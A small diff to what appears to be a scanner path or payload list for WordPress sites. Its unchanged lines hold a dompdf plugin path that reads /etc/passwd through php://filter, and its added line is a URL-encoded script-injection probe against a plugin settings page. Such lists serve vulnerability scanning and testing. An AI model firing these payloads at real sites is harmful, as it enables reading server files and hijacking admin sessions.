@@ -136,3 +136,4 @@
 /wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
 /dompdf.php
 /wp-content/plugins/
+/wp-admin/options-general.php?page=login-configurator-options&tab=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E#top
